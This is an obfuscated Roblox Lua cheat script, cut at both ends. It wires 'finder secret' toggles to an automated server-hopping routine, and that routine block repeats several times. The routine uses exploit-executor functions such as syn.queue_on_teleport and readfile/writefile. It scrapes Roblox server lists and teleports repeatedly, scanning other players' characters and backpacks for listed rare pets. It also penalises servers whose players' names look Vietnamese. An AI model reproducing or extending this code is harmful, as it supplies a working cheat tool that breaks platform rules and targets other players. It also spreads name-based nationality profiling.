then if (plr~=LP) then return;end warn("[ServerHop] Teleport failed: "   .. tostring(result)   .. " | "   .. tostring(errMsg) );FlatIdent_47E6D=1;end if (2==FlatIdent_47E6D) then HOP_LOCK=false;wait_range(CONFIG.RETRY_BACKOFF.min,CONFIG.RETRY_BACKOFF.max);FlatIdent_47E6D=3;end if (FlatIdent_47E6D==1) then if LAST_TARGET_ID then local FlatIdent_1F68E=0;while true do if (0==FlatIdent_1F68E) then fail_cooldown[LAST_TARGET_ID]=now();if (CONFIG.TEMP_BLACKLIST_ENABLED and CONFIG.TEMP_BLACKLIST_ON_FAIL) then blacklist_add(LAST_TARGET_ID,"fail:"   .. tostring(result) );end break;end end end CONSEC_FAILS+=1 FlatIdent_47E6D=2;end end end);local function boot() local FlatIdent_55C23=0;local td;while true do if (1==FlatIdent_55C23) then if (td and td.visited) then merge_num_map(visited,td.visited);end load_persist();break;end if (0==FlatIdent_55C23) then load_blacklist();td=get_tpdata();FlatIdent_55C23=1;end end end local function safe(f) local FlatIdent_16404=0;local ok;local err;while true do if (FlatIdent_16404==0) then ok,err=pcall(f);if  not ok then warn("[ServerHop] init err: ",err);end break;end end end safe(load_pet_names);safe(boot);save_blacklist();save_persist();task.defer(function() local FlatIdent_66BED=0;while true do if (FlatIdent_66BED==0) then wait_range(CONFIG.HOP_DELAY_SEC.min,CONFIG.HOP_DELAY_SEC.max);hop_once("start");break;end end end);task.spawn(function() local lastLoop,lastScan=clk(),0;while task.wait(0.25) do local FlatIdent_4A059=0;while true do if (FlatIdent_4A059==0) then if ((tick() -lastScan)>=CONFIG.PET_SCAN_INTERVAL) then local FlatIdent_72C32=0;while true do if (FlatIdent_72C32==0) then lastScan=tick();update_pet_hold();break;end end end if (HOP_LOCK and ((clk() -LOCK_AT)>CONFIG.LOCK_WATCHDOG)) then local FlatIdent_67995=0;while true do if (FlatIdent_67995==1) then print("[ServerHop] Watchdog: unlock stale lock → hop ngay");hop_once("watchdog");break;end if (FlatIdent_67995==0) then HOP_LOCK=false;if LAST_TARGET_ID then fail_cooldown[LAST_TARGET_ID]=now();end FlatIdent_67995=1;end end end FlatIdent_4A059=1;end if (FlatIdent_4A059==1) then if ( not HOP_LOCK and  not PET_HOLD and ((clk() -LAST_ATTEMPT_AT)>CONFIG.STALL_TIMEOUT_SEC)) then local FlatIdent_33242=0;while true do if (FlatIdent_33242==0) then CONSEC_FAILS=0;try_random("stall-timeout");FlatIdent_33242=1;end if (FlatIdent_33242==1) then LAST_ATTEMPT_AT=clk();break;end end end if ( not HOP_LOCK and  not PET_HOLD and ((clk() -lastLoop)>=CONFIG.LOOP_INTERVAL)) then local FlatIdent_5D3C0=0;while true do if (FlatIdent_5D3C0==0) then lastLoop=clk();hop_once("loop");break;end end end break;end end end end);print(string.format("[ServerHop] Ready on PlaceId=%d | ưu tiên 6–7, né server 'VN', block server cũ, blacklist tạm 1h | cooldown %ds",TARGET_PLACE_ID,CONFIG.FAIL_COOLDOWN));end);elseif finder_secret_10m_s_auto_thread then local FlatIdent_4415B=0;while true do if (FlatIdent_4415B==0) then task.cancel(finder_secret_10m_s_auto_thread);finder_secret_10m_s_auto_thread=nil;break;end end end end);local finder_secret_20m_s_auto_thread=nil;local finder_secret_20m_s_autoToggle=createToggle(contentTabs['Finder'],"finder secret 20m/s auto","Auto finder",2);finder_secret_20m_s_autoToggle.SetCallback(function(state) if state then if finder_secret_20m_s_auto_thread then task.cancel(finder_secret_20m_s_auto_thread);end finder_secret_20m_s_auto_thread=task.spawn(function() local TARGET_PLACE_ID=109983668079237;local PET_LIST=[[
Graipuss Medussi: 10M/s-20m/s
La Grande Combinasion: 10M/s-300M/s
Los Combinasionas: 15M/s-400M/s
Nuclearo Dinossauro: 15M/s-300M/s
Los Hotspotsitos: 20M/s-400M/s
Garama and Madundung: 50M/s-2B/s
]];local Players=game:GetService("Players");local TeleportService=game:GetService("TeleportService");local HttpService=game:GetService("HttpService");local LP=Players.LocalPlayer;local JOB_ID=game.JobId;local queue_on_tp=(syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport) ;local has_file=typeof(isfile)=="function" ;local read_file=readfile;local write_file=writefile;local del_file=delfile;local CONFIG={AVOID_FULL=true,HOP_DELAY_SEC={min=0.2,max=0.6},PREFERRED_COUNTS={6,7},NEAR_TARGET=6.5,NEAR_WINDOW={min=4,max=9},FALLBACK_MIN=2,MIN_OPEN_SOFT=2,LOCALE={avoid_vietnamese=true,vn_ratio_threshold=0.4,prefer_higher_ping_ms=120,penalty_if_vn=1000},TTL_SECONDS=3 * 60 * 60 ,MAX_REMEMBER=120000,PERSIST_TO_DISK=true,BLOCK_OLD_FOREVER=true,TEMP_BLACKLIST_ENABLED=true,TEMP_BLACKLIST_TTL=60 * 60 ,TEMP_BLACKLIST_ON_FAIL=true,RETRY_BACKOFF={min=0.35,max=0.9},LOOP_INTERVAL=2.2,FAIL_COOLDOWN=5,LOCK_WATCHDOG=3,ESCALATE_AFTER_FAILS=6,STALL_TIMEOUT_SEC=12,PET_SCAN_INTERVAL=1.5,PET_CLEAR_GRACE=2};if CONFIG.BLOCK_OLD_FOREVER then CONFIG.TTL_SECONDS=10 * 365 * 24 * 60 * 60 ;end local visited,fail_cooldown={},{};local VISITED_FILE=("visited_%d.json"):format(TARGET_PLACE_ID);local tblack={};local TBLACK_FILE=("blacklist_%d.json"):format(TARGET_PLACE_ID);local HOP_LOCK,LOCK_AT=false,0;local LAST_TARGET_ID,LAST_ATTEMPT_AT=nil,0;local CONSEC_FAILS=0;local function now() return os.time();end local function clk() return os.clock();end local function jdecode(s) local FlatIdent_25EC5=0;local ok;local d;while true do if (FlatIdent_25EC5==0) then ok,d=pcall(function() return HttpService:JSONDecode(s);end);if ok then return d;end break;end end end local function jencode(t) local FlatIdent_89852=0;local ok;local s;while true do if (FlatIdent_89852==0) then ok,s=pcall(function() return HttpService:JSONEncode(t);end);if ok then return s;end break;end end end local function wait_range(a,b) task.wait(a + (math.random() * (b-a)) );end local function on_cooldown(id) local FlatIdent_6EB64=0;local t;while true do if (FlatIdent_6EB64==0) then t=fail_cooldown[id];return t and ((now() -t)<=CONFIG.FAIL_COOLDOWN) ;end end end local function http_get(url) local FlatIdent_7690C=0;local ok;local body;while true do if (FlatIdent_7690C==0) then ok,body=pcall(game.HttpGet,game,url,true);if (ok and body) then return true,body;end FlatIdent_7690C=1;end if (FlatIdent_7690C==1) then if (syn and syn.request) then local FlatIdent_36762=0;local r;while true do if (0==FlatIdent_36762) then r=syn.request({Url=url,Method="GET"});if (r and (r.StatusCode==200)) then return true,r.Body;end break;end end end if http_request then local FlatIdent_6619=0;local r;while true do if (FlatIdent_6619==0) then r=http_request({Url=url,Method="GET"});if (r and ((r.StatusCode==200) or (r.StatusCode==0))) then return true,r.Body or r.body ;end break;end end end FlatIdent_7690C=2;end if (FlatIdent_7690C==2) then return false;end end end local function purge_old() local FlatIdent_11EF5=0;local t;local n;while true do if (FlatIdent_11EF5==2) then n=0;for _ in pairs(visited) do n+=1 end FlatIdent_11EF5=3;end if (FlatIdent_11EF5==3) then if (n>CONFIG.MAX_REMEMBER) then local drop=n-CONFIG.MAX_REMEMBER ;for k in pairs(visited) do visited[k]=nil;drop-=1 if (drop<=0) then break;end end end break;end if (FlatIdent_11EF5==0) then t=now();for id,ts in pairs(visited) do if ((type(ts)~="number") or ((t-ts)>CONFIG.TTL_SECONDS)) then visited[id]=nil;end end FlatIdent_11EF5=1;end if (FlatIdent_11EF5==1) then for id,ts in pairs(fail_cooldown) do if ((t-ts)>CONFIG.FAIL_COOLDOWN) then fail_cooldown[id]=nil;end end for id,exp in pairs(tblack) do if ((type(exp)~="number") or (t>=exp)) then tblack[id]=nil;end end FlatIdent_11EF5=2;end end end local function get_tpdata() local FlatIdent_A788=0;local out;while true do if (FlatIdent_A788==0) then out=nil;pcall(function() local FlatIdent_2DF26=0;local td;while true do if (FlatIdent_2DF26==0) then td=TeleportService:GetLocalPlayerTeleportData();if (td==nil) then out=nil;elseif ((typeof(td)=="Instance") and (td.ClassName=="TeleportOptions")) then local ok,tbl=pcall(function() return td:GetTeleportData();end);if (ok and (type(tbl)=="table")) then out=tbl;end elseif (type(td)=="table") then out=td;end break;end end end);FlatIdent_A788=1;end if (FlatIdent_A788==1) then return out;end end end local function merge_num_map(dst,src) if (type(src)~="table") then return;end for k,v in pairs(src) do if ((type(k)=="string") and (type(v)=="number")) then dst[k]=v;end end end local function reset_visited() local FlatIdent_DE13=0;while true do if (FlatIdent_DE13==0) then visited={};pcall(function() if (typeof(del_file)=="function") then del_file(VISITED_FILE);end end);FlatIdent_DE13=1;end if (FlatIdent_DE13==1) then print("[ServerHop] Đã reset danh sách server đã vào.");break;end end end if rawget(shared,"RESET_VISITED") then reset_visited();shared.RESET_VISITED=nil;end local function save_blacklist() if (CONFIG.PERSIST_TO_DISK and write_file) then local FlatIdent_73A64=0;local s;while true do if (0==FlatIdent_73A64) then s=jencode(tblack);if s then pcall(write_file,TBLACK_FILE,s);end break;end end end end local function load_blacklist() if (CONFIG.PERSIST_TO_DISK and has_file and isfile(TBLACK_FILE)) then local FlatIdent_1369F=0;local ok;local raw;while true do if (FlatIdent_1369F==0) then ok,raw=pcall(read_file,TBLACK_FILE);if (ok and raw) then local obj=jdecode(raw);if (type(obj)=="table") then for k,v in pairs(obj) do if (type(v)=="number") then tblack[k]=v;end end end end break;end end end end local function blacklist_add(id,reason) local FlatIdent_1C72A=0;while true do if (1==FlatIdent_1C72A) then print(("[ServerHop] 🛑 Blacklist 1h: %s (%s)"):format(tostring(id),tostring(reason or "" )));save_blacklist();break;end if (FlatIdent_1C72A==0) then if ( not CONFIG.TEMP_BLACKLIST_ENABLED or  not id) then return;end tblack[id]=now() + CONFIG.TEMP_BLACKLIST_TTL ;FlatIdent_1C72A=1;end end end local function is_blacklisted(id) if  not CONFIG.TEMP_BLACKLIST_ENABLED then return false;end local exp=tblack[id];return exp and (now()<exp) ;end if rawget(shared,"ADD_BLACKLIST") then local val=shared.ADD_BLACKLIST;if (type(val)=="string") then blacklist_add(val,"manual");elseif (type(val)=="table") then for _,jid in ipairs(val) do blacklist_add(tostring(jid),"manual");end end shared.ADD_BLACKLIST=nil;end if rawget(shared,"RESET_BLACKLIST") then tblack={};pcall(function() if (typeof(del_file)=="function") then del_file(TBLACK_FILE);end end);print("[ServerHop] Đã reset blacklist tạm (1h).");shared.RESET_BLACKLIST=nil;end local function save_persist() if (CONFIG.PERSIST_TO_DISK and write_file) then local FlatIdent_6FD89=0;local s;while true do if (FlatIdent_6FD89==0) then s=jencode(visited);if s then pcall(write_file,VISITED_FILE,s);end break;end end end end local function load_persist() local FlatIdent_64D52=0;local td;while true do if (FlatIdent_64D52==1) then if (CONFIG.PERSIST_TO_DISK and has_file and isfile(VISITED_FILE)) then local FlatIdent_94796=0;local ok;local raw;while true do if (FlatIdent_94796==0) then ok,raw=pcall(read_file,VISITED_FILE);if (ok and raw) then merge_num_map(visited,jdecode(raw) or {} );end break;end end end if rawget(shared,"__HOP_CARRY") then local c=shared.__HOP_CARRY;if c.visited then merge_num_map(visited,c.visited);end end FlatIdent_64D52=2;end if (FlatIdent_64D52==0) then td=get_tpdata();if (td and td.visited) then merge_num_map(visited,td.visited);end FlatIdent_64D52=1;end if (FlatIdent_64D52==2) then visited[JOB_ID]=now();purge_old();break;end end end local function carry_on_tp() if  not queue_on_tp then return;end local blob=jencode(visited) or "{}" ;pcall(queue_on_tp,([[shared.__HOP_CARRY={visited=%s}]]):format(blob));end local function fetch_v1(cursor) local FlatIdent_773B1=0;local url;local ok;local body;local obj;while true do if (0==FlatIdent_773B1) then url=("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100%s"):format(TARGET_PLACE_ID,(cursor and ("&cursor="   .. HttpService:UrlEncode(cursor))) or "" );ok,body=http_get(url);FlatIdent_773B1=1;end if (FlatIdent_773B1==2) then if  not obj then return nil;end return obj;end if (1==FlatIdent_773B1) then if  not ok then return nil;end obj=jdecode(body);FlatIdent_773B1=2;end end end local function fetch_legacy(startindex) local FlatIdent_983E3=0;local url;local ok;local body;local obj;local data;while true do if (4==FlatIdent_983E3) then return {data=data,nextPageCursor=(( #data==0) and nil) or tostring(startindex + 10 ) };end if (FlatIdent_983E3==0) then startindex=tonumber(startindex) or 0 ;url=("https://www.roblox.com/games/getgameinstancesjson?placeId=%d&startindex=%d"):format(TARGET_PLACE_ID,startindex);FlatIdent_983E3=1;end if (FlatIdent_983E3==2) then obj=jdecode(body);if ( not obj or  not obj.Collection) then return nil;end FlatIdent_983E3=3;end if (FlatIdent_983E3==1) then ok,body=http_get(url);if  not ok then return nil;end FlatIdent_983E3=2;end if (3==FlatIdent_983E3) then data={};for _,v in ipairs(obj.Collection) do local FlatIdent_70F0F=0;local players;while true do if (FlatIdent_70F0F==1) then table.insert(data,{id=v.Guid,maxPlayers=v.Capacity,playing=(v.CurrentPlayers and  #v.CurrentPlayers) or v.CurrentPlayers or 0 ,ping=tonumber(v.Ping),players=players});break;end if (0==FlatIdent_70F0F) then players={};if (type(v.CurrentPlayers)=="table") then for _,p in ipairs(v.CurrentPlayers) do table.insert(players,{username=tostring(p.Username or "" ),display=tostring(p.DisplayName or "" )});end end FlatIdent_70F0F=1;end end end FlatIdent_983E3=4;end end end local VIET_CHARS_PATTERN="[àáạảãâầấậẩẫ ăằắặẳẵèéẹẻẽêềếệểễ ìíịỉĩ òóọỏõôồốộổỗơờớợởỡ ùúụủũưừứựửữ ỳýỵỷỹ đĐ]";local VN_KEYWORDS={" viet"," việt"," vn"," nguyen"," trần"," tran "," lê "," le "," pham "," phạm "," ngoc "," minh "};local function looks_vietnamese(s) s=" "   .. string.lower(s or "" )   .. " " ;if s:find(VIET_CHARS_PATTERN) then return true;end for _,kw in ipairs(VN_KEYWORDS) do if s:find(kw,1,true) then return true;end end return false;end local function vn_ratio(players) local FlatIdent_3ECBA=0;local vn;local total;while true do if (FlatIdent_3ECBA==0) then if ( not players or ( #players==0)) then return 0;end vn,total=0,0;FlatIdent_3ECBA=1;end if (FlatIdent_3ECBA==1) then for _,p in ipairs(players) do local FlatIdent_95104=0;while true do if (0==FlatIdent_95104) then total+=1 if (looks_vietnamese(p.display) or looks_vietnamese(p.username)) then vn+=1 end break;end end end return vn/total ;end end end local PET_NAMES,PET_HOLD,PET_LAST_SEEN,PET_LAST_FOUND_LIST={},false,0,{};local function normalize_pet_list(text) local FlatIdent_68FA=0;local set;while true do if (FlatIdent_68FA==1) then return set;end if (FlatIdent_68FA==0) then set={};for raw in tostring(text):gmatch("[^\r\n]+") do local line=raw:gsub("^%s+",""):gsub("%s+$","");if ((line~="") and  not line:match("^%-%-")) then local FlatIdent_8088E=0;local nameOnly;while true do if (FlatIdent_8088E==0) then nameOnly=line:match("^(.-):") or line ;nameOnly=nameOnly:gsub("%s+$","");FlatIdent_8088E=1;end if (1==FlatIdent_8088E) then set[string.lower(nameOnly)]=true;break;end end end end FlatIdent_68FA=1;end end end local function load_pet_names() local FlatIdent_6C091=0;local set;while true do if (FlatIdent_6C091==0) then set=normalize_pet_list(PET_LIST or "" );if (has_file and isfile("pets_list.txt")) then local ok,raw=pcall(read_file,"pets_list.txt");if (ok and raw) then for k,_ in pairs(normalize_pet_list(raw)) do set[k]=true;end end end FlatIdent_6C091=1;end if (FlatIdent_6C091==1) then PET_NAMES=set;break;end end end local function name_hit(sLower) for want,_ in pairs(PET_NAMES) do if sLower:find(want,1,true) then return want;end end end local function scan_for_pets() if (next(PET_NAMES)==nil) then return false,{};end local found,matched=false,{};for _,plr in ipairs(Players:GetPlayers()) do local FlatIdent_2AA3B=0;local ch;local bp;while true do if (FlatIdent_2AA3B==0) then ch=plr.Character;if ch then for _,inst in ipairs(ch:GetDescendants()) do local FlatIdent_85D76=0;local nm;local hit;while true do if (FlatIdent_85D76==0) then nm=string.lower(inst.Name or "" );hit=name_hit(nm);FlatIdent_85D76=1;end if (FlatIdent_85D76==1) then if hit then local FlatIdent_64B9B=0;while true do if (FlatIdent_64B9B==0) then found=true;matched[hit]=true;break;end end end if inst:IsA("StringValue") then local v=string.lower(tostring(inst.Value or "" ));local h2=name_hit(v);if h2 then local FlatIdent_3E230=0;while true do if (FlatIdent_3E230==0) then found=true;matched[h2]=true;break;end end end end break;end end end end FlatIdent_2AA3B=1;end if (FlatIdent_2AA3B==1) then bp=plr:FindFirstChildOfClass("Backpack");if bp then for _,inst in ipairs(bp:GetDescendants()) do local FlatIdent_5471B=0;local nm;local hit;while true do if (FlatIdent_5471B==0) then nm=string.lower(inst.Name or "" );hit=name_hit(nm);FlatIdent_5471B=1;end if (FlatIdent_5471B==1) then if hit then found=true;matched[hit]=true;end break;end end end end break;end end end for _,inst in ipairs(workspace:GetDescendants()) do if (inst:IsA("Model") or inst:IsA("Folder") or inst:IsA("Accessory") or inst:IsA("Tool")) then local FlatIdent_3BAEF=0;local nm;local hit;while true do if (FlatIdent_3BAEF==1) then if hit then local FlatIdent_7ED16=0;while true do if (FlatIdent_7ED16==0) then found=true;matched[hit]=true;break;end end end break;end if (FlatIdent_3BAEF==0) then nm=string.lower(inst.Name or "" );hit=name_hit(nm);FlatIdent_3BAEF=1;end end elseif inst:IsA("StringValue") then local FlatIdent_2A7CF=0;local v;local h2;while true do if (FlatIdent_2A7CF==0) then v=string.lower(tostring(inst.Value or "" ));h2=name_hit(v);FlatIdent_2A7CF=1;end if (FlatIdent_2A7CF==1) then if h2 then local FlatIdent_255D7=0;while true do if (FlatIdent_255D7==0) then found=true;matched[h2]=true;break;end end end break;end end end end return found,matched;end local function update_pet_hold() local ok,matched=scan_for_pets();local tnow=tick();if ok then PET_LAST_SEEN=tnow;if  not PET_HOLD then local FlatIdent_5B4EF=0;while true do if (FlatIdent_5B4EF==0) then PET_HOLD=true;PET_LAST_FOUND_LIST={};FlatIdent_5B4EF=1;end if (1==FlatIdent_5B4EF) then for k,_ in pairs(matched) do table.insert(PET_LAST_FOUND_LIST,k);end print("[ServerHop] ▶️ gặp PET → dừng:",table.concat(PET_LAST_FOUND_LIST,", "));break;end end end elseif (PET_HOLD and ((tnow-PET_LAST_SEEN)>=CONFIG.PET_CLEAR_GRACE)) then local FlatIdent_19383=0;while true do if (FlatIdent_19383==0) then PET_HOLD=false;print("[ServerHop] ⏩ pet hết → tiếp tục");break;end end end end local function in_pref(n) for _,v in ipairs(CONFIG.PREFERRED_COUNTS) do if (n==v) then return true;end end end local function pick_server() local bestPref,bestNear,bestFb,bestAny=nil,nil,nil,nil;local nearScore,fbScore,anyScore= -999999995904, -999999995904, -999999995904;local cursor,tries,mode=nil,0,"legacy";local function consider(s) local FlatIdent_4415F=0;local id;local playing;local cap;local open;local vr;local isVN;local vnPenalty;local openPenalty;local pingBonus;while true do if (FlatIdent_4415F==3) then if ((playing>=CONFIG.NEAR_WINDOW.min) and (playing<=CONFIG.NEAR_WINDOW.max) and (open>0)) then local FlatIdent_6F79E=0;local sc;while true do if (FlatIdent_6F79E==0) then sc=((( -math.abs(playing-CONFIG.NEAR_TARGET ) -openPenalty) -(open * 0.001)) -vnPenalty) + pingBonus ;if (sc>nearScore) then nearScore=sc;bestNear=s;end break;end end end if ((open>0) and (playing>=CONFIG.FALLBACK_MIN)) then local FlatIdent_1D95C=0;local sc;while true do if (FlatIdent_1D95C==0) then sc=(( -math.abs(playing-CONFIG.NEAR_TARGET ) -openPenalty) -vnPenalty) + pingBonus ;if (sc>fbScore) then fbScore=sc;bestFb=s;end break;end end end if (open>0) then local sc=(( -math.abs(playing-CONFIG.NEAR_TARGET ) -openPenalty) -vnPenalty) + pingBonus ;if (sc>anyScore) then anyScore=sc;bestAny=s;end end break;end if (FlatIdent_4415F==1) then if ((id==JOB_ID) or visited[id] or on_cooldown(id) or (CONFIG.TEMP_BLACKLIST_ENABLED and is_blacklisted(id))) then return;end if (CONFIG.AVOID_FULL and (open<=0)) then return;end vr=(s.players and vn_ratio(s.players)) or 0 ;isVN=CONFIG.LOCALE.avoid_vietnamese and (vr>=CONFIG.LOCALE.vn_ratio_threshold) ;FlatIdent_4415F=2;end if (0==FlatIdent_4415F) then id=s.id;playing=tonumber(s.playing) or 0 ;cap=tonumber(s.maxPlayers) or 100 ;open=cap-playing ;FlatIdent_4415F=1;end if (FlatIdent_4415F==2) then vnPenalty=(isVN and CONFIG.LOCALE.penalty_if_vn) or 0 ;openPenalty=((open<CONFIG.MIN_OPEN_SOFT) and 2) or 0 ;pingBonus=(s.ping and (CONFIG.LOCALE.prefer_higher_ping_ms>0) and (s.ping>=CONFIG.LOCALE.prefer_higher_ping_ms) and 0.5) or 0 ;if (in_pref(playing) and (open>0)) then local sc=((10000 -(open * 0.01)) -vnPenalty) + pingBonus ;if ( not bestPref or (sc>(10000 -0.01))) then bestPref=s;end end FlatIdent_4415F=3;end end end while tries<60  do local page=((mode=="legacy") and fetch_legacy(cursor)) or fetch_v1(cursor) ;if  not page then local FlatIdent_959F6=0;while true do if (FlatIdent_959F6==0) then mode=((mode=="legacy") and "v1") or "legacy" ;tries+=1 break;end end else for _,s in ipairs(page.data or {} ) do consider(s);end if (bestPref or ( not page.nextPageCursor and (bestNear or bestFb or bestAny))) then break;end cursor=page.nextPageCursor;if  not cursor then mode=((mode=="legacy") and "v1") or "legacy" ;end tries+=1 end end if bestPref then return bestPref,"pref6/7";end if bestNear then return bestNear,"near(4-9)";end if bestFb then return bestFb,"fallback>=2";end return bestAny,"anyopen";end local function try_teleport(jobId,reason) local FlatIdent_88E79=0;local ok;local err;while true do if (FlatIdent_88E79==2) then task.wait(0.05);ok,err=pcall(function() TeleportService:TeleportToPlaceInstance(TARGET_PLACE_ID,jobId,LP,nil,{visited=visited});end);FlatIdent_88E79=3;end if (FlatIdent_88E79==3) then if ok then return true;end warn("[ServerHop] Teleport 5-arg error: "   .. tostring(err) );FlatIdent_88E79=4;end if (FlatIdent_88E79==4) then return false,err;end if (FlatIdent_88E79==1) then if ok then return true;end warn("[ServerHop] Teleport 3-arg error: "   .. tostring(err) );FlatIdent_88E79=2;end if (FlatIdent_88E79==0) then print(("[ServerHop] Calling Teleport (reason=%s)"):format(reason or "?" ));ok,err=pcall(function() TeleportService:TeleportToPlaceInstance(TARGET_PLACE_ID,jobId,LP);end);FlatIdent_88E79=1;end end end local function try_random(reason) print(("[ServerHop] Random Teleport (reason=%s)"):format(reason or "?" ));local ok,err=pcall(function() TeleportService:Teleport(TARGET_PLACE_ID,LP,{visited=visited});end);if ok then return true;end warn("[ServerHop] Random Teleport(place,player,data) error: "   .. tostring(err) );task.wait(0.05);ok,err=pcall(function() TeleportService:Teleport(TARGET_PLACE_ID);end);if ok then return true;end warn("[ServerHop] Random Teleport(place) error: "   .. tostring(err) );return false,err;end local function save_and_carry() local FlatIdent_6E8F7=0;while true do if (FlatIdent_6E8F7==0) then if (CONFIG.PERSIST_TO_DISK and write_file) then local FlatIdent_2660B=0;local s;while true do if (FlatIdent_2660B==0) then s=jencode(visited);if s then pcall(write_file,VISITED_FILE,s);end break;end end end if queue_on_tp then local FlatIdent_7889D=0;local blob;while true do if (FlatIdent_7889D==0) then blob=jencode(visited) or "{}" ;pcall(queue_on_tp,([[shared.__HOP_CARRY={visited=%s}]]):format(blob));break;end end end break;end end end local function hop_once(tag) if (HOP_LOCK or PET_HOLD) then return;end HOP_LOCK=true;LOCK_AT=clk();purge_old();local target,why=pick_server();if  not target then local FlatIdent_3324E=0;while true do if (0==FlatIdent_3324E) then warn("[ServerHop] Hết server phù hợp. Chờ rồi thử lại…");HOP_LOCK=false;FlatIdent_3324E=1;end if (FlatIdent_3324E==1) then return;end end end LAST_TARGET_ID=target.id;LAST_ATTEMPT_AT=clk();save_and_carry();print(string.format("[ServerHop] Hopping to %s | players=%s (%s)",target.id,tostring(target.playing),tostring(why)));local okTeleport=try_teleport(target.id,why);if  not okTeleport then HOP_LOCK=false;return;end end TeleportService.TeleportInitFailed:Connect(function(plr,result,errMsg) local FlatIdent_92611=0;while true do if (FlatIdent_92611==2) then HOP_LOCK=false;wait_range(CONFIG.RETRY_BACKOFF.min,CONFIG.RETRY_BACKOFF.max);FlatIdent_92611=3;end if (FlatIdent_92611==1) then if LAST_TARGET_ID then fail_cooldown[LAST_TARGET_ID]=now();if (CONFIG.TEMP_BLACKLIST_ENABLED and CONFIG.TEMP_BLACKLIST_ON_FAIL) then blacklist_add(LAST_TARGET_ID,"fail:"   .. tostring(result) );end end CONSEC_FAILS+=1 FlatIdent_92611=2;end if (FlatIdent_92611==3) then if ((CONSEC_FAILS>=CONFIG.ESCALATE_AFTER_FAILS) and  not PET_HOLD) then local FlatIdent_983A4=0;while true do if (FlatIdent_983A4==0) then CONSEC_FAILS=0;try_random("escalate-fails");break;end end else hop_once("retry:"   .. tostring(result) );end break;end if (FlatIdent_92611==0) then if (plr~=LP) then return;end warn("[ServerHop] Teleport failed: "   .. tostring(result)   .. " | "   .. tostring(errMsg) );FlatIdent_92611=1;end end end);local function boot() load_blacklist();local td=get_tpdata();if (td and td.visited) then merge_num_map(visited,td.visited);end load_persist();end local function safe(f) local ok,err=pcall(f);if  not ok then warn("[ServerHop] init err: ",err);end end safe(load_pet_names);safe(boot);save_blacklist();save_persist();task.defer(function() local FlatIdent_8B148=0;while true do if (FlatIdent_8B148==0) then wait_range(CONFIG.HOP_DELAY_SEC.min,CONFIG.HOP_DELAY_SEC.max);hop_once("start");break;end end end);task.spawn(function() local lastLoop,lastScan=clk(),0;while task.wait(0.25) do local FlatIdent_8E576=0;while true do if (FlatIdent_8E576==1) then if ( not HOP_LOCK and  not PET_HOLD and ((clk() -LAST_ATTEMPT_AT)>CONFIG.STALL_TIMEOUT_SEC)) then local FlatIdent_7ABB5=0;while true do if (FlatIdent_7ABB5==0) then CONSEC_FAILS=0;try_random("stall-timeout");FlatIdent_7ABB5=1;end if (FlatIdent_7ABB5==1) then LAST_ATTEMPT_AT=clk();break;end end end if ( not HOP_LOCK and  not PET_HOLD and ((clk() -lastLoop)>=CONFIG.LOOP_INTERVAL)) then local FlatIdent_2F3D2=0;while true do if (FlatIdent_2F3D2==0) then lastLoop=clk();hop_once("loop");break;end end end break;end if (FlatIdent_8E576==0) then if ((tick() -lastScan)>=CONFIG.PET_SCAN_INTERVAL) then local FlatIdent_536EB=0;while true do if (FlatIdent_536EB==0) then lastScan=tick();update_pet_hold();break;end end end if (HOP_LOCK and ((clk() -LOCK_AT)>CONFIG.LOCK_WATCHDOG)) then local FlatIdent_4E059=0;while true do if (FlatIdent_4E059==0) then HOP_LOCK=false;if LAST_TARGET_ID then fail_cooldown[LAST_TARGET_ID]=now();end FlatIdent_4E059=1;end if (FlatIdent_4E059==1) then print("[ServerHop] Watchdog: unlock stale lock → hop ngay");hop_once("watchdog");break;end end end FlatIdent_8E576=1;end end end end);print(string.format("[ServerHop] Ready on PlaceId=%d | ưu tiên 6–7, né server 'VN', block server cũ, blacklist tạm 1h | cooldown %ds",TARGET_PLACE_ID,CONFIG.FAIL_COOLDOWN));end);elseif finder_secret_20m_s_auto_thread then local FlatIdent_E617=0;while true do if (FlatIdent_E617==0) then task.cancel(finder_secret_20m_s_auto_thread);finder_secret_20m_s_auto_thread=nil;break;end end end end);local finder_secret_50m_s_auto_thread=nil;local finder_secret_50m_s_autoToggle=createToggle(contentTabs['Finder'],"finder secret 50m/s auto","Auto finder",3);finder_secret_50m_s_autoToggle.SetCallback(function(state) if state then if finder_secret_50m_s_auto_thread then task.cancel(finder_secret_50m_s_auto_thread);end finder_secret_50m_s_auto_thread=task.spawn(function() local TARGET_PLACE_ID=109983668079237;local PET_LIST=[[
Graipuss Medussi: 10M/s-20m/s
La Grande Combinasion: 10M/s-300M/s
Los Combinasionas: 15M/s-400M/s
Nuclearo Dinossauro: 15M/s-300M/s
Los Hotspotsitos: 20M/s-400M/s
Garama and Madundung: 50M/s-2B/s
]];local Players=game:GetService("Players");local TeleportService=game:GetService("TeleportService");local HttpService=game:GetService("HttpService");local LP=Players.LocalPlayer;local JOB_ID=game.JobId;local queue_on_tp=(syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport) ;local has_file=typeof(isfile)=="function" ;local read_file=readfile;local write_file=writefile;local del_file=delfile;local CONFIG={AVOID_FULL=true,HOP_DELAY_SEC={min=0.2,max=0.6},PREFERRED_COUNTS={6,7},NEAR_TARGET=6.5,NEAR_WINDOW={min=4,max=9},FALLBACK_MIN=2,MIN_OPEN_SOFT=2,LOCALE={avoid_vietnamese=true,vn_ratio_threshold=0.4,prefer_higher_ping_ms=120,penalty_if_vn=1000},TTL_SECONDS=3 * 60 * 60 ,MAX_REMEMBER=120000,PERSIST_TO_DISK=true,BLOCK_OLD_FOREVER=true,TEMP_BLACKLIST_ENABLED=true,TEMP_BLACKLIST_TTL=60 * 60 ,TEMP_BLACKLIST_ON_FAIL=true,RETRY_BACKOFF={min=0.35,max=0.9},LOOP_INTERVAL=2.2,FAIL_COOLDOWN=5,LOCK_WATCHDOG=3,ESCALATE_AFTER_FAILS=6,STALL_TIMEOUT_SEC=12,PET_SCAN_INTERVAL=1.5,PET_CLEAR_GRACE=2};if CONFIG.BLOCK_OLD_FOREVER then CONFIG.TTL_SECONDS=10 * 365 * 24 * 60 * 60 ;end local visited,fail_cooldown={},{};local VISITED_FILE=("visited_%d.json"):format(TARGET_PLACE_ID);local tblack={};local TBLACK_FILE=("blacklist_%d.json"):format(TARGET_PLACE_ID);local HOP_LOCK,LOCK_AT=false,0;local LAST_TARGET_ID,LAST_ATTEMPT_AT=nil,0;local CONSEC_FAILS=0;local function now() return os.time();end local function clk() return os.clock();end local function jdecode(s) local 